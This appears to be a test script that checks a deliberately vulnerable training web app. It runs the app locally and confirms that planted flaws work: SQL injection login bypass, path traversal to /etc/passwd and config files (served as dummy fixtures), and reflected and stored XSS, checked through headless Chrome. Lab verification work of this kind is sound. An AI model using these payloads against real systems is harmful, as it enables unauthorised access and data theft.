import { prepareTestDatabase } from './database.mjs';
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { mkdtempSync, readFileSync, rmSync, existsSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';

const root = mkdtempSync(path.join(tmpdir(),'moklet-vuln-check-'));
const password = 'temporary-vuln-test-password';
const evidence = [];
const wait = ms => new Promise(resolve => setTimeout(resolve,ms));
let server, chrome, socket;
const children = [];
async function stop(child) {
  if (!child || child.exitCode !== null) return;
  const closed = new Promise(resolve => child.once('exit',resolve));
  child.kill('SIGTERM');
  const timer = setTimeout(() => child.kill('SIGKILL'),3000);
  await closed;clearTimeout(timer);
}
async function main() {
  await prepareTestDatabase();
  const base = await new Promise((resolve,reject) => {
    server = spawn(process.execPath,['server.mjs'],{env:{...process.env,NODE_ENV:'production',NEXT_TELEMETRY_DISABLED:'1',PORT_WEB:'0',UUK_ENABLE_AUXILIARY:'false',UUK_ENABLE_RCE_LAB:'false',UUK_DATA_DIR:path.join(root,'data'),UUK_INSTANCE:'VULN-VERIFICATION',UUK_DEMO_PASSWORD:password},stdio:['ignore','pipe','pipe']});
    children.push(server);
    let log = '';
    const timer = setTimeout(() => reject(new Error('Server startup timeout: '+log)),15000);
    server.stdout.on('data',chunk => { log += chunk;const m = log.match(/listening on (\d+)/);if (m) {clearTimeout(timer);resolve('http://127.0.0.1:'+m[1]);} });
    server.stderr.on('data',chunk => {log += chunk;});
    server.once('error',reject);
    server.once('exit',code => {clearTimeout(timer);reject(new Error(`Server exited ${code}: ${log}`));});
  });
  const cookies = {};
  async function request(route,role,data) {
    return fetch(base+route,{redirect:'manual',method:data ? 'POST' : 'GET',headers:cookies[role] ? {Cookie:cookies[role]} : {},body:data ? new URLSearchParams(data) : undefined});
  }
  for (const role of ['employee','hr','admin']) {
    const response = await request('/action/login',null,{username:role,password});
    assert.equal(response.status,303);
    cookies[role] = response.headers.get('set-cookie').split(';')[0];
  }
  const rows = html => (html.match(/<tbody>([\s\S]*?)<\/tbody>/)?.[1].match(/<tr>/g) || []).length;
  const loginPayload = "' OR 1=1 -- ";
  for (const [username,role] of [['employee','Employee'],['manager','Manager'],['hr','HR'],['admin','Administrator']]) {
    assert.equal((await request('/action/login',null,{username,password:'wrong-password'})).status,401);
    const response = await request('/action/login',null,{username,password:loginPayload});
    assert.equal(response.status,303);
    const home = await fetch(base+'/',{headers:{Cookie:response.headers.get('set-cookie').split(';')[0]}});
    assert.ok((await home.text()).includes(role+' · Demo account'));
    evidence.push({type:'SQL injection',method:'POST',endpoint:'/action/login',param:'password',payload:loginPayload,username,role,status:303,result:'Wrong password 401; injected password creates session for selected role'});
  }
  const directory = await request('/page/hr/employees?'+new URLSearchParams({q:loginPayload}),'hr');
  assert.equal(directory.status,200);assert.equal(rows(await directory.text()),0);
  for (const [endpoint,param,normal,expected] of [
    ['/page/reports/report-builder','department','Engineering',4],
  ]) {
    const plain = await request(endpoint+'?'+new URLSearchParams({[param]:normal}),'hr');
    assert.equal(plain.status,200);assert.equal(rows(await plain.text()),expected);
    const payload = "' OR 1=1 -- ";
    const response = await request(endpoint+'?'+new URLSearchParams({[param]:payload}),'hr');
    assert.equal(response.status,200);assert.equal(rows(await response.text()),24);
    const denied = await request(endpoint+'?'+new URLSearchParams({[param]:payload}),'employee');
    assert.equal(denied.status,403);
    assert.equal((await request(endpoint)).status,303);
    evidence.push({type:'SQL injection',method:'GET',endpoint,param,payload,role:'HR / Administrator',status:200,result:`Normal ${expected} row(s); injected 24 rows; Employee 403; anonymous 303`});
  }
  for (const [payload,marker] of [
    ['../internal/audit-marker.txt','UUK-PATH-TRAVERSAL-PROOF: VULN-VERIFICATION'],
    ['../../../../../etc/passwd','moklet-demo:x:1001:1001:Dummy Training Account:'],
  ]) {
    const route = '/document/download?'+new URLSearchParams({file:payload});
    const response = await request(route,'employee');assert.equal(response.status,200);
    assert.ok((await response.text()).includes(marker));
    if (payload.endsWith('/etc/passwd')) assert.equal(response.headers.get('x-uuk-lab-fixture'),'dummy-etc-passwd');
    assert.equal((await request(route)).status,303);
    evidence.push({type:payload.endsWith('/etc/passwd') ? 'Path traversal dummy mapping' : 'Path traversal',method:'GET',endpoint:'/document/download',param:'file',payload,role:'Any logged-in role',status:200,result:marker});
  }
  for (const payload of ['../../../../../etc/shadow','/etc/passwd','../../../etc/passwd']) assert.equal((await request('/document/download?'+new URLSearchParams({file:payload}),'employee')).status,404);

  const { LINUX_FIXTURES } = await import('../src/lib/lab-files.mjs');
  for (const target of Object.keys(LINUX_FIXTURES)) {
    for (const file of [target,'../../../../..'+target]) {
      const route = '/document/download?'+new URLSearchParams({file});
      assert.equal((await request(route)).status,303);
      const response = await request(route,'employee');
      assert.equal(response.status,200);
      assert.equal(response.headers.get('x-uuk-lab-fixture'),'dummy-linux-config');
      assert.ok((await response.text()).includes('UUK-LFI-DEMO: '+target));
    }
  }
  evidence.push({type:'Easy Linux config traversal fixtures',method:'GET',endpoint:'/document/download',param:'file',payload:'../../../../../etc/mysql/my.cnf',role:'Any logged-in role',status:200,result:'All 20 README paths verified as absolute paths and traversal payloads; dummy fixtures only; anonymous 303'});

  const binary = process.env.CHROME_PATH || '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';
  assert.ok(existsSync(binary),'Set CHROME_PATH to a Chrome/Chromium executable for browser verification');
  const profile = path.join(root,'chrome');
  chrome = spawn(binary,['--headless=new','--remote-debugging-port=0',`--user-data-dir=${profile}`,'--no-first-run','--no-default-browser-check','--disable-background-networking','about:blank'],{stdio:['ignore','ignore','pipe']});
  children.push(chrome);
  let chromeLog = '';chrome.stderr.on('data',chunk => {chromeLog += chunk;});
  const active = path.join(profile,'DevToolsActivePort');
  for (let i=0;i<100 && !existsSync(active);i++) { if (chrome.exitCode !== null) throw new Error('Chrome exited: '+chromeLog);await wait(100); }
  assert.ok(existsSync(active),'Chrome debugging startup timed out: '+chromeLog);
  const [port,wsPath] = readFileSync(active,'utf8').trim().split('\n');
  socket = new WebSocket(`ws://127.0.0.1:${port}${wsPath}`);
  await new Promise((resolve,reject) => {socket.addEventListener('open',resolve,{once:true});socket.addEventListener('error',reject,{once:true});});
  let id = 0;
  const dialogs = [];
  const pending = new Map();
  socket.addEventListener('message',event => {
    const message = JSON.parse(event.data);
    if (message.method === 'Page.javascriptDialogOpening') {
      dialogs.push(message.params.message);
      command('Page.handleJavaScriptDialog',{accept:true},message.sessionId).catch(() => {});
    }
    const task = pending.get(message.id);
    if (!task) return;
    pending.delete(message.id);clearTimeout(task.timer);
    if (message.error) task.reject(new Error(task.method+': '+JSON.stringify(message.error)));else task.resolve(message.result);
  });
  const command = (method,params = {},sessionId) => new Promise((resolve,reject) => {
    const key = ++id;
    const timer = setTimeout(() => {pending.delete(key);reject(new Error('CDP timeout '+method));},5000);
    pending.set(key,{resolve,reject,timer,method});socket.send(JSON.stringify({id:key,method,params,...(sessionId ? {sessionId} : {})}));
  });
  const version = await command('Browser.getVersion');
  const {targetId} = await command('Target.createTarget',{url:'about:blank'});
  const {sessionId} = await command('Target.attachToTarget',{targetId,flatten:true});
  await command('Page.enable',{},sessionId);
  await command('Network.enable',{},sessionId);
  const value = cookies.employee.slice('uuk_session='.length);
  assert.equal((await command('Network.setCookie',{name:'uuk_session',value,url:base,path:'/',httpOnly:true,sameSite:'Lax'},sessionId)).success,true);
  const evaluate = async (expression,session,contextId) => {
    const result = await command('Runtime.evaluate',{expression,returnByValue:true,...(contextId ? {contextId} : {})},session);
    if (result.exceptionDetails) throw new Error(JSON.stringify(result.exceptionDetails));
    return result.result.value;
  };
  const inspectFrame = async marker => {
    const expression = `(() => {let parentBlocked=false;try{void parent.document.body}catch{parentBlocked=true}return {text:document.body?.textContent.trim(),parentBlocked}})()`;
    for (let i=0;i<40;i++) {
      const {targetInfos} = await command('Target.getTargets');
      for (const frame of targetInfos.filter(t => t.type === 'iframe')) {
        let attached;
        try {
          attached = await command('Target.attachToTarget',{targetId:frame.targetId,flatten:true});
          const result = await evaluate(expression,attached.sessionId);
          if (result?.text === marker) return result;
        } catch {} finally { if (attached) try { await command('Target.detachFromTarget',{sessionId:attached.sessionId}); } catch {} }
      }
      const {frameTree} = await command('Page.getFrameTree',{},sessionId);
      for (const frame of frameTree.childFrames || []) try {
        const {executionContextId} = await command('Page.createIsolatedWorld',{frameId:frame.frame.id,worldName:'lab-verification',grantUniveralAccess:false},sessionId);
        const result = await evaluate(expression,sessionId,executionContextId);
        if (result?.text === marker) return result;
      } catch {}
      await wait(100);
    }
    throw new Error('XSS marker did not execute in iframe: '+marker);
  };
  for (const [file,marker] of [
    ['employee-handbook.txt','Employee Handbook'],
    ['../internal/audit-marker.txt','UUK-PATH-TRAVERSAL-PROOF'],
    ['../../../../../etc/mysql/my.cnf','UUK-LFI-DEMO'],
  ]) {
    const target = base+'/document/download?'+new URLSearchParams({file});
    await command('Page.navigate',{url:target},sessionId);
    let visible;
    for (let i=0;i<40;i++) {
      try { visible = await evaluate('({url:location.href,text:document.body?.innerText})',sessionId); } catch {}
      if (visible?.url === target && visible.text?.includes(marker)) break;
      await wait(100);
    }
    assert.equal(visible?.url,target,'File endpoint must remain visible in browser address bar');
    assert.ok(visible.text.includes(marker),'File must render as text instead of triggering a download');
  }
  evidence.push({type:'Document inline preview',method:'GET',endpoint:'/document/download',param:'file',payload:'../internal/audit-marker.txt',role:'Any logged-in role',status:200,result:'Chrome renders normal document, traversal marker and Linux fixture as text; file endpoint stays in browser address bar'});
  for (const [kind,marker] of [['reflected','XSS_REFLECTED_OK'],['stored','XSS_STORED_OK']]) {
    const payload = `<script>alert(1);document.body.innerHTML="${marker}"</script>`;
    let route;
    if (kind === 'reflected') route = '/search/helpdesk?'+new URLSearchParams({q:payload});
    else {
      const posted = await request('/action/comment','employee',{ticket_id:'1',body:payload});
      assert.equal(posted.status,303);route = '/page/helpdesk/ticket-comments';
    }
    await command('Page.navigate',{url:base+route},sessionId);
    const result = await inspectFrame(marker);
    assert.equal(result.parentBlocked,true,'Sandbox must block access to parent document');
    assert.equal(dialogs.pop(),'1','Beginner alert(1) must open a native dialog');
    evidence.push({type:kind+' XSS',method:kind === 'stored' ? 'POST' : 'GET',endpoint:kind === 'stored' ? '/action/comment' : '/search/helpdesk',param:kind === 'stored' ? 'body (ticket_id=1)' : 'q',payload,role:'Employee (ticket 1) / other authorized roles',status:kind === 'stored' ? 303 : 200,result:`${marker} executed in iframe; alert(1) dialog verified; parent document blocked; ${version.product}`,view:route.split('?')[0]});
  }
  const report = {verifiedAt:new Date().toISOString(),environment:'Temporary production Next.js instance and dedicated MariaDB test schema, not the deployed portal database',browser:version.product,evidence};
  writeFileSync('docs/vulnerability-verification.json',JSON.stringify(report,null,2)+'\n');
  console.log(JSON.stringify(report,null,2));
}
try { await main(); }
finally { socket?.close();for (const child of children.reverse()) await stop(child);rmSync(root,{recursive:true,force:true}); }
